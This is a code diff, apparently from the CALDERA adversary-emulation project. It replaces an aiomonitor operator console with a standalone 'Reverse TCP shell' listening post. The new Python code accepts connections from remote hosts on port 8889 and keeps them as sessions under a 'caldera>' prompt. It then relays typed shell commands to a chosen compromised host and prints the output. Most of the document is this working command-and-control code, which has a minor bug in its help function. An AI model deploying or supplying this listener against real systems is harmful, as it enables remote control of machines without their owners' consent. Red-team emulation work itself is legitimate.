@@ -1,143 +1,179 @@
+import argparse
 import asyncio
-import csv
-from base64 import b64decode
-import textwrap
+import signal
+import socket
+import struct
+import sys
+import threading
+import time
 
-import aiomonitor
-from tabulate import tabulate
-from termcolor import colored
+from queue import Queue
 
-class TerminalApp(aiomonitor.Monitor):
-
-    def do_help(self):
-        self._sout.write('\n'+'Application commands:' + '\n')
-        self._sout.write('\t'+'ab: view abilities (optional) ability ID' + '\n')
-        self._sout.write('\t'+'ad: view adversaries (optional) adversary ID' + '\n')
-        self._sout.write('\t'+'ag: view all running agents' + '\n')
-        self._sout.write('\t'+'cl: run cleanup commands(required) operation ID' + '\n')
-        self._sout.write('\t'+'gr: view groups (optional) group ID' + '\n')
-        self._sout.write('\t'+'op: view started operations (optional) operation ID to see the decision chain' + '\n')
-        self._sout.write('\t'+'qu: queue an operation to be started later (required) operation name, adversary ID and group ID (optional) jitter fraction, cleanup and stealth' + '\n')
-        self._sout.write('\t'+'re: view a specific result (required) link ID - from the decision chain.' + '\n')
-        self._sout.write('\t'+'st: start an operation. (required) a queued operation ID.' + '\n')
-        self._sout.write('\n'+'Generic commands:' + '\n')
-        self._sout.write('\t'+'help: see this output again' + '\n')
-        self._sout.write('\t'+'console: open an aysnc Python console' + '\n')
-        self._sout.write('\t'+'ps: show task table' + '\n')
-
-    def do_ag(self):
-        service = self._locals['services']['data_svc']
-        co = asyncio.run_coroutine_threadsafe(service.explode_agents(), loop=self._loop)
-        agents = co.result()
-        headers = ['id', 'hostname', 'paw', 'checks', 'last_seen', 'sleep', 'executor', 'server']
-        self._output(headers, [list(x.values()) for x in agents])
-
-    def do_gr(self, identifier=None):
-        service = self._locals['services']['data_svc']
-        co = asyncio.run_coroutine_threadsafe(service.explode_groups(dict(id=identifier)), loop=self._loop)
-        groups = co.result()
-        if identifier:
-            self._output(['group_id', 'agent_id'], [[a['group_id'], a['agent_id']] for g in groups for a in g['agents']])
-            return
-        self._output(['id', 'name'], [[g['id'], g['name']] for g in groups])
-
-    def do_ab(self, identifier=None):
-        service = self._locals['services']['data_svc']
-        co = asyncio.run_coroutine_threadsafe(service.explode_abilities(dict(id=identifier)), loop=self._loop)
-        abilities = co.result()
-        if identifier:
-            command = self._decode(abilities[0]['test'])
-            self._output(['command'], [[command]])
-            return
-        headers = ['id', 'tactic', 'name', 'description']
-        abilities = sorted(abilities, key=lambda i: i['technique']['tactic'])
-        rows = [[a['id'], a['technique']['tactic'], a['name'], a['description']] for a in abilities]
-        self._output(headers, rows)
-
-    def do_ad(self, identifier=None):
-        service = self._locals['services']['data_svc']
-        co = asyncio.run_coroutine_threadsafe(service.explode_adversaries(dict(id=identifier)), loop=self._loop)
-        adversaries = co.result()
-        if identifier:
-            rows = []
-            for adv in adversaries:
-                for phase, abilities in adv['phases'].items():
-                    for a in abilities:
-                        rows.append([phase, a['id'], a['technique']['tactic'], a['name'], self._decode(a['test'])])
-            self._output(['phase', 'ability_id', 'tactic', 'name', 'command'], rows)
-            return
-        rows = [[adv['id'], adv['name'], adv['description']] for adv in adversaries]
-        self._output(['id', 'name', 'description'], rows)
-
-    def do_cl(self, op_id):
-        service = self._locals['services']['operation_svc']
-        asyncio.run_coroutine_threadsafe(service.cleanup(op_id), loop=self._loop)
-        self._sout.write(str(colored('Clean up commands queued', 'yellow')) + '\n')
-
-    def do_op(self, identifier=None):
-        service = self._locals['services']['data_svc']
-        co = asyncio.run_coroutine_threadsafe(service.explode_operation(dict(id=identifier)), loop=self._loop)
-        operations = co.result()
-        if identifier:
-            rows = [[l['id'], l['host_id'], l['status'], l['score'], l['collect'], self._decode(l['command'])] for l in operations[0]['chain']]
-            self._output(['link_id', 'agent', 'status', 'score', 'executed', 'command'], rows)
-            return
-        rows = []
-        for o in operations:
-            group = o['host_group']['id']
-            adversary = o['adversary']['id']
-            rows.append([o['id'], o['name'], group, adversary, o['start'], o['finish'], o['phase']])
-        self._output(['id', 'name', 'group', 'adversary', 'start', 'finish', 'completed phase'], rows)
-
-    def do_qu(self, name, adv_name, group_name, jitter='3/5', cleanup=True, stealth=False):
-        service = self._locals['services']['data_svc']
-        op = dict(name=name, group=group_name, adversary=adv_name, jitter=jitter, cleanup=cleanup, stealth=stealth)
-        co = asyncio.run_coroutine_threadsafe(service.create_operation(**op), loop=self._loop)
-        self._sout.write(str(colored('\nQueued operation #%s. Start it with "st %s"' % (co.result(), co.result()), 'yellow')) + '\n')
-
-    def do_re(self, link_id):
-        service = self._locals['services']['data_svc']
-        co = asyncio.run_coroutine_threadsafe(service.explode_results(dict(link_id=link_id)), loop=self._loop)
-        for r in co.result():
-            self._flush(self._decode(r['output']))
-
-    def do_st(self, op_id):
-        service = self._locals['services']['operation_svc']
-        asyncio.run_coroutine_threadsafe(service.run(op_id), loop=self._loop)
-        self._sout.write(str(colored('Started!', 'yellow')) + '\n')
-
-    def do_up(self, csv_path, op_id):
-        service = self._locals['services']['data_svc']
-        with open(csv_path, 'r') as f:
-            next(f)
-            reader = csv.reader(f, delimiter=',')
-            for line in reader:
-                fact = dict(op_id=op_id, fact=line[0], value=line[1], score=line[2], link_id=0, action=line[3])
-                asyncio.run_coroutine_threadsafe(service.dao.create('dark_fact', fact), loop=self._loop)
-                self._sout.write(str(colored('Added %s to op #%s' % (line[0], op_id), 'yellow')) + '\n')
+queue = Queue()
 
 
-    """ PRIVATE """
+class C2:
+
+    def __init__(self):
+        self.special_help = dict()
+
+    def execute_special(self, cmd):
+        print('Command not recognized')
+
+
+class ListeningPost(C2):
+
+    def __init__(self, host, port):
+        super().__init__()
+        self.host = host
+        self.port = port
+        self.socket = None
+        self.all_connections = []
+        self.all_addresses = []
+        self.connection_retry = 5
+        shell_help = dict(help='Show this help', sessions='List sessions', enter='Enter a session by index')
+        self.help = {**shell_help, **self.special_help}
+
+    def register_signal_handler(self):
+        signal.signal(signal.SIGINT, self._quit_gracefully)
+        signal.signal(signal.SIGTERM, self._quit_gracefully)
+
+    def socket_bind(self):
+        try:
+            self.socket = socket.socket()
+            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            self.socket.bind((self.host, self.port))
+            self.socket.listen(self.connection_retry)
+        except socket.error as e:
+            print('Socket binding error: %s' % e)
+            time.sleep(self.connection_retry)
+            self.socket_bind()
+
+    def accept_connections(self):
+        while True:
+            try:
+                conn, address = self.socket.accept()
+                conn.setblocking(1)
+                client_hostname = conn.recv(1024).decode('utf-8')
+                address = address + (client_hostname,)
+                self.all_connections.append(conn)
+                self.all_addresses.append(address)
+                print('New session: {0} ({1})'.format(address[-1], address[0]))
+            except Exception as e:
+                print('Error accepting connections: %s' % e)
+
+    def start_shell(self):
+        while True:
+            cmd = input('caldera> ')
+            if cmd == 'sessions':
+                self._list_connections()
+            elif 'enter' in cmd:
+                self._send_target_commands(int(cmd.split(' ')[-1]))
+            elif cmd == 'help':
+                self._print_help()
+            elif cmd == '':
+                pass
+            else:
+                self.execute_special(cmd)
+
+    def _quit_gracefully(self, signal=None, frame=None):
+        for conn in self.all_connections:
+            conn.shutdown(2)
+            conn.close()
+        print('Connection closed')
+        sys.exit(0)
+
+    def _print_help(self):
+        for cmd, v in self.commands.items():
+            print('{0}: {1}'.format(cmd, v))
+
+    def _list_connections(self):
+        for i, conn in enumerate(self.all_connections):
+            try:
+                conn.send(str.encode(' '))
+                conn.recv(20480)
+                print(i, self.all_addresses[i][0], self.all_addresses[i][1], self.all_addresses[i][2])
+            except Exception:
+                del self.all_connections[i]
+                del self.all_addresses[i]
+
+    def _read_command_output(self, conn):
+        raw_msg_len = self._recvall(conn, 4)
+        if not raw_msg_len:
+            return None
+        msg_len = struct.unpack('>I', raw_msg_len)[0]
+        return self._recvall(conn, msg_len)
 
     @staticmethod
-    def _decode(blob):
-        return b64decode(blob).decode('utf-8')
+    def _recvall(conn, n):
+        data = b''
+        while len(data) < n:
+            packet = conn.recv(n - len(data))
+            if not packet:
+                return None
+            data += packet
+        return data
 
-    def _output(self, headers, rows):
-        headers = [str(colored(h, 'red')) for h in headers]
-        rows.insert(0, headers)
-        rows = self._adjust_width(rows)
-        table = tabulate(rows, headers='firstrow', tablefmt='orgtbl')
-        self._sout.write(str(table) + '\n')
+    def _send_target_commands(self, target):
+        conn = self.all_connections[target]
+        conn.send(str.encode(' '))
+        cwd_bytes = self._read_command_output(conn)
+        cwd = str(cwd_bytes, 'utf-8')
+        print(cwd, end='')
+        while True:
+            try:
+                cmd = input()
+                if len(str.encode(cmd)) > 0:
+                    conn.send(str.encode(cmd))
+                    cmd_output = self._read_command_output(conn)
+                    client_response = str(cmd_output, 'utf-8')
+                    print(client_response, end='')
+                if cmd == 'background':
+                    print('\n')
+                    break
+            except Exception as e:
+                print('Connection was lost %s' % e)
+                break
+        del self.all_connections[target]
+        del self.all_addresses[target]
 
-    def _flush(self, content):
-        content = colored(content, 'yellow')
-        self._sout.write(str(content) + '\n')
 
-    @staticmethod
-    def _adjust_width(rows):
-        for row in rows:
-            for n, el in enumerate(row):
-                if isinstance(el, str):
-                    row[n] = '\n'.join(textwrap.wrap(el, 75))
-        return rows
+def create_workers(host, port):
+    server = ListeningPost(host, port)
+    server.register_signal_handler()
+    for _ in range(2):
+        t = threading.Thread(target=work, args=(server,))
+        t.daemon = True
+        t.start()
+
+
+def create_jobs():
+    queue.put(0)
+    queue.put(1)
+    queue.join()
+
+
+def work(server):
+    while True:
+        x = queue.get()
+        if x == 0:  # handle clients
+            server.socket_bind()
+            server.accept_connections()
+        if x == 1:  # handle server
+            server.start_shell()
+        queue.task_done()
+
+
+def main():
+    parser = argparse.ArgumentParser('Reverse TCP shell')
+    parser.add_argument('-H', '--host', required=False, default='0.0.0.0')
+    parser.add_argument('-P', '--port', required=False, default=8889)
+    args = parser.parse_args()
+    create_workers(args.host, args.port)
+    create_jobs()
+
+
+if __name__ == '__main__':
+    # loop = asyncio.get_event_loop()
+    # loop.run_until_complete(main(loop))
+    main()
